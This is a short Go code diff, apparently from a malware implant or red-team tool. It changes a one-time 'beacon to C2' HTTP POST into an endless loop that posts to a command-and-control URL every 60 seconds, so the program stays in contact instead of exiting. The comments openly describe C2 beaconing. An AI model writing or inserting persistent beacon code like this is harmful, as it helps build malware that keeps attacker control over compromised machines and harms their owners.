@@ -68,13 +68,15 @@ func main() {
 	}
 	fmt.Println("Done")
 
-	//beacon to C2 once
-	fmt.Println("Beaconing to C2 once...")
-	post_err := http_post(post_url, body)
-	if post_err != nil {
-	panic(post_err)
-	}
+	//wait a few seconds then terminate
+	time.Sleep(10 * time.Second)
 
-        //wait a few seconds then terminate
-        time.Sleep(10 * time.Second)
+	// beacon home every 60 seconds forever
+	for {
+		post_err := http_post(post_url, body)
+		if post_err != nil {
+				panic(post_err)
+		}
+		time.Sleep(60 * time.Second)
+	}
 }
